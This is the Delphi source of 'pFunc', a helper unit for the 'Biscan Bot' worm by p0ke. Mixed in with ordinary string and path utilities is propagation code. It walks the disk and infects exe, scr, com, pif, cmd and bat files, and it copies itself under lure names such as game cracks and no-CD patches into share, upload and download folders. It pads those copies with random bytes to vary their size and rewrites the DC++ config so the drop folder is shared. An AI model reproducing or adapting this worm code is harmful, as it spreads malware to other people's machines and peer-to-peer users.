(* Biscan Bot: Coded by p0ke *)
{ -- http://p0ke.no-ip.com -- }


(*

  Unit covering the most functions out there.
  Instead of use all stupid libraries, just define some functions ;)

  made by p0ke

*)

unit pFunc;

interface

{$DEFINE URLDownloadToFile}    // Used to download and save files.
{$DEFINE StrLCopy}             //
{.$DEFINE DirectoryExists}      // Checks if a directory exists
{.$DEFINE GetFileSize}          // Returns given file's size
{$DEFINE LowerCase}            // Returns given string in lowercase
{$DEFINE UpperCase}            // Returns given string in uppercase
{$DEFINE ExtractFileExt}       // Extracts file extension
{$DEFINE ExtractFileName}      // Extracts file name
{$DEFINE ExtractFilePath}      // Extracts file path
{$DEFINE InttoStr}             // Integer to String
{$DEFINE StrtoInt}             // String to Integer
{$DEFINE SysDir}               // Returns System Directory
{$DEFINE WinDir}               // Returns Windows Directory
{$DEFINE TmpDir}               // Returns Temp Directory
{$DEFINE CurDir}               // Returns Current Directory
{$DEFINE Trim}                 // Trims given string
{$DEFINE IPstr}                // Return IP of given DNS
{$DEFINE GetNet}               // Returns NetSpeed (LAN/DIAL-UP)
{$DEFINE GetOS}                // Returns Local OS (Unknown, Win95, Win98, Win98SE, WinMe, WinNT, Win2k, Winxp)
{$DEFINE AllocMem}             //
{$DEFINE StrPas}               //
{$DEFINE FileExists}           // Checks if given file exists
{$DEFINE RandomName}           // Works good for making random names to ircbots
{$DEFINE RandomGarbage}        // To make files different sizes.
{$DEFINE RandomDir}            // To randomize a dir.
{$DEFINE FindShit}             // To Serach For Files
{$DEFINE ScanFiles}            // Search "Engine"
{$DEFINE InfectFiles}          // Infect files (exe scr com pif cmd bat)
{$DEFINE InfectDirs}           // Drop Files (share, download, upload dirs)
{$DEFINE DCspread}             // DirectConnect++ Spread
{$DEFINE RandomFileName}       // Generate a Random FileName
{$DEFINE InfectDC}             // Infects DC

{$DEFINE ReplaceStr}           // Replaces given string with another given string
{$DEFINE ExecuteFile}          // Executes a file.
{$DEFINE SendKeys}

Uses
{$IFDEF ExecuteFile}    ShellApi, {$ENDIF}
{$IFDEF IpStr}          Winsock,  {$ENDIF}
{$IFDEF GetNet}         Wininet,  {$ENDIF}
                        Windows;

{$IFDEF FindShit}
Type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;

  LongRec = packed record
  case Integer of
    0: (Lo, Hi: Word);
    1: (Words: array [0..1] of Word);
    2: (Bytes: array [0..3] of Byte);
  end;

  const
    fmOpenRead                          = $0000;
    fmShareDenyWrite                    = $0020;
    faSysFile                           = $00000004;
    faVolumeID                          = $00000008;
    faDirectory                         = $00000010;
    faHidden                            = $00000002;
{$ENDIF}

{$IFDEF URLDownloadToFile}     function URLDownloadToFile(Caller: cardinal; URL: PChar;
                                         FileName: PChar; Reserved: LongWord;
                                         StatusCB: cardinal): Longword; stdcall;
                                         external 'URLMON.DLL' name 'URLDownloadToFileA';                      {$ENDIF}
{$IFDEF StrLCopy}              function StrLCopy(Dest: PChar; const Source: PChar;
                                         MaxLen: Cardinal): PChar; assembler;                                  {$ENDIF}
{$IFDEF DirectoryExists}       function DirectoryExists(const Directory: string): Boolean;                     {$ENDIF}
{$IFDEF GetFileSize}           function GetFileSize(FileName: String): Int64;                                  {$ENDIF}
{$IFDEF LowerCase}             function LowerCase(const S: string): string;                                    {$ENDIF}
{$IFDEF UpperCase}             function UpperCase(const S: string): string;                                    {$ENDIF}
{$IFDEF ExtractFileExt}        function ExtractFileExt(const Filename: string): string;                        {$ENDIF}
{$IFDEF ExtractFileName}       function ExtractFileName(const Path: string): string;                           {$ENDIF}
{$IFDEF ExtractFilePath}       function ExtractFilePath(const Path: string): string;                           {$ENDIF}
{$IFDEF InttoStr}              function InttoStr(const Value: integer): string;                                {$ENDIF}
{$IFDEF StrtoInt}              function StrtoInt(const S: string): integer;                                    {$ENDIF}
{$IFDEF SysDir}                function SysDir(FileName: String): String;                                      {$ENDIF}
{$IFDEF WinDir}                function WinDir(FileName: String): String;                                      {$ENDIF}
{$IFDEF TmpDir}                function TmpDir(FileName: String): String;                                      {$ENDIF}
{$IFDEF CurDir}                function CurDir(FileName: String): String;                                      {$ENDIF}
{$IFDEF Trim}                  function Trim(const S: string): string;                                         {$ENDIF}
{$IFDEF IPstr}                 function IPstr(HostName:String) : String;                                       {$ENDIF}
{$IFDEF GetNet}                function GetNet:String;                                                         {$ENDIF}
{$IFDEF GetOS}                 function GetOS: string;                                                         {$ENDIF}
{$IFDEF AllocMem}              function AllocMem(Size: Cardinal): Pointer;                                     {$ENDIF}
{$IFDEF StrPas}                function StrPas(const Str: PChar): string;                                      {$ENDIF}
{$IFDEF FileExists}            function FileExists(const FileName: string): Boolean;                           {$ENDIF}
{$IFDEF RandomName}            function RandomName: String;                                                    {$ENDIF}
{$IFDEF RandomGarbage}         function RandomGarbage(name: string; size: integer): Bool;                      {$ENDIF}
{$IFDEF RandomDir}             function RandomDir: String;                                                     {$ENDIF}
{$IFDEF FindShit}              function FindFirst(const Path: string; Attr: Integer;var F: TSearchRec):Integer;
                               function FindNext(var F: TSearchRec): Integer;
                               function FindMatchingFile(var F: TSearchRec): Integer;
                               procedure FindClose(var F: TSearchRec);                                         {$ENDIF}
{$IFDEF RandomFileName}        function RandomFileName: String;                                                {$ENDIF}

{$IFDEF SendKeys}              procedure MakeWindowActive(wHandle: hWnd);
                               function GetHandleFromWindowTitle(TitleText: String): hWnd;
                               procedure SendKey(const text: String);                                          {$ENDIF}
{$IFDEF InfectDC}              procedure InfectDC(Path: String);                                               {$ENDIF}
{$IFDEF ScanFiles}             procedure ScanFiles(D, Name, SearchName: String);                               {$ENDIF}
{$IFDEF ReplaceStr}            Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);           {$ENDIF}
{$IFDEF ExecuteFile}           Procedure ExecuteFile(F: String; Show:Boolean);                                 {$ENDIF}
                               procedure CreateDCDir;

implementation

Uses pInfect, pBot;

{$IFDEF SendKeys}
function SetBit(Bits: Integer; BitToSet: integer): Integer;
begin
  Result := (Bits or (1 shl BitToSet))
end;
{$IFDEF SendKeys}
{$ENDIF}
function StrPCopy(Dest: PChar; const Source: string): PChar;
begin
  Result := StrLCopy(Dest, PChar(Source), Length(Source));
end;

function GetHandleFromWindowTitle(TitleText: String): hWnd;
var
  StrBuf: Array[0..$FF] of Char;
begin
  Result := FindWindow(PChar(0), StrPCopy(StrBuf, TitleText));
end;
{$IFDEF SendKeys}
{$ENDIF}
procedure SendKey(const text: String);
var
   i: Integer;
   shift: Boolean;
   vk,scancode: Word;
   ch: Char;
   c,s: Byte;
const
   vk_keys: Array[0..9] of Byte =
      (VK_HOME,VK_END,VK_UP,VK_DOWN,VK_LEFT,
        VK_RIGHT,VK_PRIOR,VK_NEXT,VK_INSERT,
        VK_DELETE);
   vk_shft: Array[0..2] of Byte =
     (VK_SHIFT,VK_CONTROL,VK_MENU);
   flags: Array[false..true] of Integer =
     (KEYEVENTF_KEYUP, 0);
begin
   shift := false;
   for i := 1 to Length(text) do
   begin
      ch := text[i];
      if ch >= #250 then
      begin
         s := Ord(ch) - 250;
         shift := not Odd(s);
         c := vk_shft[s shr 1];
         scancode := MapVirtualKey(c,0);
         Keybd_Event(c,scancode,flags[shift],0);
      end
      else
      begin
         vk := 0;
         if ch >= #240 then
            c := vk_keys[Ord(ch) - 240]
         else if ch >= #228 then
            {228 (F1) => $70 (vk_F1)}
            c := Ord(ch) - 116
         else if ch < #32 then
            c := Ord(ch)
         else
         begin
            vk :=VkKeyScan(ch);
            c :=LoByte(vk);
         end;
         scancode := MapVirtualKey(c,0);
         if not shift and (Hi(vk) > 0) then
            { $2A = scancode of VK_SHIFT }
            Keybd_Event(VK_SHIFT,$2A,0,0);
         Keybd_Event(c,scancode,0,0);
         Keybd_Event(c,scancode,
               KEYEVENTF_KEYUP,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,
               $2A,KEYEVENTF_KEYUP,0);
      end;
   end;
end;
{$IFDEF SendKeys}
{$ENDIF}
procedure MakeWindowActive(wHandle: hWnd);
begin
  if IsIconic(wHandle) then
   ShowWindow(wHandle, SW_RESTORE)
  else
   setforegroundwindow(wHandle);
end;
{$ENDIF}
procedure CreateDCDir;
var
  i:integer;
  n:string;
begin
{$IFDEF DCspread}
  if CreateDirectory(pchar(WinDir('win32dc')), nil) then
  inc(scan_copied,10);
  for i:=0 to 9 do
  begin
    n := WinDir('win32dc\')+RandomFileName+'.exe';
    CopyFile(pChar(ParamStr(0)), pChar(n), False);
    if random(100) > 30 then
      randomgarbage(n, 1024*random(5));
  end;
{$ENDIF}
end;
{$IFDEF RandomFileName}
function RandomFileName: String;
const
  part_two: array[0..9] of string =('crack', 'trainer', 'nocd', 'fix', 'patch',
                                    'cdfix','cheat','codes','hack','serial');
  part_one: array[0..9] of string =('BattleField 1942', 'Doom 3', 'Sims 2', 'FlatOut', 'DAoC',
                                    'Counter-Strike', 'Silent Hill 4', 'Half-Life 2', 'UT2004', 'Quake3');
begin
  Randomize;
  Case Random(4) Of
    0: Result := part_one[random(10)]+' '+part_two[random(10)];
    1: Result := part_one[random(10)]+'_'+part_two[random(10)];
    2: Result := part_one[random(10)]+'('+part_two[random(10)]+')';
    3: Result := part_one[random(10)]+' + '+part_two[random(10)];
  End;
end;
{$ENDIF}
{$IFDEF InfectDC}
procedure InfectDC(Path: String);
Var
  f: TextFile;
  l: String;
  t: String;
  e: String;
Begin
  AssignFile(F, Path+'DCPlusPlus.xml');
  Reset(F);
  Read(F, L);
  t := l;
  ReadLn(F, L);
  While Not Eof(F) Do
  Begin
    Read(F, L);
    t := t + l;
    ReadLn(F, L);
  End;
  CloseFile(F);
  e := Copy(t, 1, pos('<Description type="string">', t)-1);
  e := e + '<Description type="string">Biscan</Description>';
  t := Copy(t, Pos('</Description>', t)+14, Length(T));
  e := e + Copy(T, 1, pos('<Share>', t)+7);
  e := e + '<Directory>'+WinDir('win32dc')+'</Directory>' + Copy(T, pos('<Share>', t)+7, Length(T));
  AssignFile(F, Path+'DCPlusPlus.xml');
  Rewrite(F);
  Write(F, e);
  CloseFile(F);
End;
{$ENDIF}
{$IFDEF ScanFiles}
procedure ScanFiles(D, Name, SearchName: String);
Var
  SR: TSearchRec;
  file_ext : string;
  I: integer;
Begin
  If D[Length(D)] <> '\' Then D := D + '\';
  If FindFirst(D + '*.*', faDirectory, Sr) = 0 Then
  Repeat
    If ((SR.Attr And faDirectory) = faDirectory) and (sr.Name[1] <> '.') Then
    begin
      if (lowercase(D + SR.Name) <> lowercase(sysdir(''))) or
         (lowercase(D + SR.Name) <> lowercase(windir(''))) or
         (lowercase(D + SR.Name) <> lowercase(curdir(''))) or
         (lowercase(D + SR.Name) <> lowercase(tmpdir(''))) then
           ScanFiles(D + SR.Name + '\', Name, SearchName);
    End Else
    Begin
      file_ext := lowercase(ExtractFileExt(sr.name));
      {$IFDEF InfectDC}
      if lowercase(Sr.Name) = 'dcplusplus.xml' then
        InfectDC(D);
      {$ENDIF}

      {$IFDEF InfectFiles}
        if file_ext = 'exe'  then InfectFile(D+Sr.Name);
        if file_ext = 'pif'  then InfectFile(D+Sr.Name);
        if file_ext = 'com'  then InfectFile(D+Sr.Name);
        if file_ext = 'scr'  then InfectFile(D+Sr.Name);
        if file_ext = 'cmd'  then InfectFile(D+Sr.Name);
        if file_ext = 'bat'  then InfectFile(D+Sr.Name);
      {$ENDIF}
      {$IFDEF InfectDirs}
        If Pos('share', lowercase(d)) > 0 then
        begin
          if pos(d+#1, paths) = 0 then
          begin
            paths := paths + D + #1;
            inc(scan_copied,10);
            inc(scan_infecteddirs);
            for i:=0 to 9 do CopyFile(pChar(ParamStr(0)), pChar(D+RandomFileName+'.exe'), False);
          end;
        end;
        If Pos('upload', lowercase(d)) > 0 then
        begin
          if pos(d+#1, paths) = 0 then
          begin
            paths := paths + D + #1;
            inc(scan_copied,10);
            inc(scan_infecteddirs);
            for i:=0 to 9 do CopyFile(pChar(ParamStr(0)), pChar(D+RandomFileName+'.exe'), False);
          end;
        end;
        If Pos('download', lowercase(d)) > 0 then
        begin
          if pos(d+#1, paths) = 0 then
          begin
            paths := paths + D + #1;
            inc(scan_copied,10);
            inc(scan_infecteddirs);
            for i:=0 to 9 do CopyFile(pChar(ParamStr(0)), pChar(D+RandomFileName+'.exe'), False);
          end;
        end;
      {$ENDIF}
    End;
  Until FindNext(SR) <> 0;
  FindClose(SR);
End;
{$ENDIF}
{$IFDEF FindShit}
function FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

procedure FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function FindFirst(const Path: string; Attr: Integer;var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;

function FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;
{$ENDIF}
{$IFDEF RandomGarbage}
function RandomGarbage(name: string; size: integer): Bool;
var
  f: TextFile;
  i: integer;
Begin
  try
    assignfile(f, name);
    append(f);
    for i := 0 to size do
      write(f, chr(random(255)+1));
    closefile(f);
    result := true;
  except
    result := false;
    exit;
  end;
end;
{$ENDIF}
{$IFDEF RandomDir}
function RandomDir: String;
begin
  randomize;
  case random(4) of
    0: result := '%sys%';
    1: result := '%cur%';
    2: result := '%tmp%';
    3: result := '%win%';
  end;
end;
{$ENDIF}
{$IFDEF RandomName}
function RandomName: String;
var
  abc: String;
  len: integer;
begin
  randomize;

  abc := 'abcdefghijklmnopqrstuvwxyz';
  result := '';
  len := random(20)+1;

  while length(result) < len do
    case random(2) of
      0:insert( UpperCase(copy(abc, random(length(abc)+1), 1)), result, length(result));
      1:insert( LowerCase(copy(abc, random(length(abc)+1), 1)), result, length(result));
    end;

end;
{$ENDIF}
{$IFDEF FileExists}
function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;
{$ENDIF}
{$IFDEF StrLCopy}
function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
asm
        PUSH    EDI
        PUSH    ESI
        PUSH    EBX
        MOV     ESI,EAX
        MOV     EDI,EDX
        MOV     EBX,ECX
        XOR     AL,AL
        TEST    ECX,ECX
        JZ      @@1
        REPNE   SCASB
        JNE     @@1
        INC     ECX
@@1:    SUB     EBX,ECX
        MOV     EDI,ESI
        MOV     ESI,EDX
        MOV     EDX,EDI
        MOV     ECX,EBX
        SHR     ECX,2
        REP     MOVSD
        MOV     ECX,EBX
        AND     ECX,3
        REP     MOVSB
        STOSB
        MOV     EAX,EDX
        POP     EBX
        POP     ESI
        POP     EDI
end;
{$ENDIF}
{$IFDEF StrPas}
function StrPas(const Str: PChar): string;
begin
  Result := Str;
end;
{$ENDIF}
{$IFDEF AllocMem}
function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;
{$ENDIF}
{$IFDEF UpperCase}
function UpperCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;
{$ENDIF}
{$IFDEF GetOs}
function GetOS: string;
const
  cOsUnknown  = 'Unknown';
  cOsWin95    = 'Win95';
  cOsWin98    = 'Win98';
  cOsWin98SE  = 'W98SE';
  cOsWinME    = 'WinME';
  cOsWinNT    = 'WinNT';
  cOsWin2000  = 'Win2k';
  cOsXP       = 'WinXP';
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := cOsUnknown;
  { set operating system type flag }
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then
  begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
        begin
          if majorVer <= 4 then
            Result := cOsWinNT
          else if (majorVer = 5) and (minorVer = 0) then
            Result := cOsWin2000
          else if (majorVer = 5) and (minorVer = 1) then
            Result := cOsXP
          else
            Result := cOsUnknown;
        end; 
      VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
        begin 
          if (majorVer = 4) and (minorVer = 0) then
            Result := cOsWin95
          else if (majorVer = 4) and (minorVer = 10) then
          begin
            if osVerInfo.szCSDVersion[1] = 'A' then
              Result := cOsWin98SE
            else
              Result := cOsWin98; 
          end
          else if (majorVer = 4) and (minorVer = 90) then
            Result := cOsWinME
          else
            Result := cOsUnknown;
        end;
      else
        Result := cOsUnknown;
    end;
  end
  else
    Result := cOsUnknown;
end;
{$ENDIF}
{$IFDEF GetNet}
Function GetNet:String;
Var
 S:Dword;
Begin
 S := INTERNET_CONNECTION_LAN;
 If InternetGetConnectedState(@S ,0) Then
  If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
   Result := 'LAN';
 S := INTERNET_CONNECTION_MODEM;
 If InternetGetConnectedState(@S ,0) Then
  If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
   Result := 'Dial-up';
End;
{$ENDIF}
{$IFDEF IpStr}
function IPstr(HostName:String) : String;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;
{$ENDIF}
{$IFDEF Trim}
function Trim(const S: string): string;
var
 I, L: Integer;
begin
 L := Length(S);
 I := 1;
 while (I <= L) and (S[I] <= ' ') do Inc(I);
 if I > L then Result := '' else
  begin
   while S[L] <= ' ' do Dec(L);
   Result := Copy(S, I, L - I + 1);
  end;
end;
{$ENDIF}
{$IFDEF ExecuteFile}
Procedure ExecuteFile(F: String; Show:Boolean);
Begin
  ShellExecute(0,'open',pChar(F),NIL,NIL,Integer(Show));
End;
{$ENDIF}
{$IFDEF ReplaceStr}
Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);//Length(ReplaceWord);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;
{$ENDIF}
{$IFDEF TmpDir}
Function TmpDir(FileName: String): String;
Var
  Dir: Array[0..256] Of Char;
Begin
  GetTempPath(256, Dir);
  Result := String(Dir)+'\'+FileName;
End;
{$ENDIF}
{$IFDEF CurDir}
Function CurDir(FileName: String): String;
Var
  Dir: Array[0..256] Of Char;
Begin
  GetCurrentDirectory(256, Dir);
  Result := String(Dir)+'\'+FileName;
End;
{$ENDIF}
{$IFDEF WinDir}
Function WinDir(FileName: String): String;
Var
  Dir: Array[0..256] Of Char;
Begin
  GetWindowsDirectory(Dir, 256);
  Result := String(Dir)+'\'+FileName;
End;
{$ENDIF}
{$IFDEF SysDir}
Function SysDir(FileName: String): String;
Var
  Dir: Array[0..256] Of Char;
Begin
  GetSystemDirectory(Dir, 256);
  Result := String(Dir)+'\'+FileName;
End;
{$ENDIF}
{$IFDEF StrToInt}
function StrtoInt(const S: string): integer;
var
  E: integer;
begin
  Val(S, Result, E);
end;
{$ENDIF}
{$IFDEF IntToStr}
function InttoStr(const Value: integer): string;
var
  S: string[11];
begin
  Str(Value, S);
  Result := S;
end;
{$ENDIF}
{$IFDEF ExtractFilePath}
function ExtractFilePath(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, 1, i);
      Break;
    end;
  end;
end;
{$ENDIF}
{$IFDEF ExtractFileName}
function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;
{$ENDIF}
{$IFDEF ExtractFileExt}
function ExtractFileExt(const Filename: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Filename);
  for i := L downto 1 do
  begin
    Ch := Filename[i];
    if (Ch = '.') then
    begin
      Result := Copy(Filename, i + 1, L - i);
      Break;
    end;
  end;
end;
{$ENDIF}

{$IFDEF LowerCase}
function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;
{$ENDIF}

{$IFDEF GetFileSize}
function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;
{$ENDIF}

{$IFDEF DirectoryExists}
function DirectoryExists(const Directory: string): Boolean;
var
  Code: Integer;
begin
  Code := GetFileAttributes(PChar(Directory));
  Result := (Code <> -1) and (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
end;
{$ENDIF}

end.
 